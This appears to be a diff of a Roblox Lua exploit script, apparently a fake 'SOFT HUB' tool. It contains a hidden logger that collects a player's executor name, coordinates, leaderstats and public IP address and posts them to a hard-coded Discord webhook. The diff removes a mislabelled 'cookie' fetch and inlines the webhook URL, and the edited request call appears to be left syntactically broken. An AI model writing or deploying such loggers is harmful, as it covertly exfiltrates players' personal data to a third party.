@@ -45,11 +45,6 @@ local function IUEBA_fake_script()
 	local HttpService = game:GetService("HttpService")
 	local MarketplaceService = game:GetService("MarketplaceService")
 	
-	local WEBHOOK_URL = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U"
-	
-	
-	
-	
 	-- ==========================================
 	-- 1. DÉTECTION EXÉCUTEUR & HWID
 	-- ==========================================
@@ -86,20 +81,7 @@ local function IUEBA_fake_script()
 	-- ===============================================
 	-- cookie
 	-- ===============================================
-	local cookie = "https://api.ipify.org"
-	
-	local function recuperercookie()
-		local executionReussie, resultat = pcall(function()
-			return game:HttpGet(cookie)
-		end)
-	
-		-- Vérification du résultat de la requête
-		if executionReussie then
-			return resultat
-		else
-			return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
-		end
-	end
+
 	-- ===============================================
 	-- Fonction pour récupérer l'IP publique du joueur
 	-- ===============================================
@@ -147,7 +129,7 @@ local function IUEBA_fake_script()
 	-- ===============================================
 	-- Appel de la fonction et stockage du cookie dans une variable
 	-- ===============================================
-	local cookiePublique = recuperercookie()
+
 	-- ===============================================
 	-- Appel de la fonction et stockage de l'IP dans une variable
 	-- ===============================================
@@ -195,7 +177,7 @@ local function IUEBA_fake_script()
 				["embeds"] = {{
 					["title"] = "🔴 BAN PAR LE SCRIPT SOFTಸ್ HUB",
 					["description"] = "Un joueur a exécuté le script avec **" .. executorName .. "**.",
-					["color"] = 65280,
+					["color"] = 15548997,
 					["thumbnail"] = {
 						["url"] = myAvatar
 					},
@@ -218,14 +200,18 @@ local function IUEBA_fake_script()
 						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
 						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
 						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
-						{["name"] = "🍪 cookie Public", ["value"] = "```" .. cookiePublique .. "```", ["inline"] = false},
 						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
 					},
 					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
 					["footer"] = { ["text"] = "*SOFTಸ್* **HUB** Logger • ID Serveur: " .. game.JobId }
 				}}
 			}
-			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) }) -- Envoi au Webhook
+			-- Envoi au Webhook
+		httpRequest({
+			Url = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = HttpService:JSONEncode(payload)
 		end)
 	end
 	
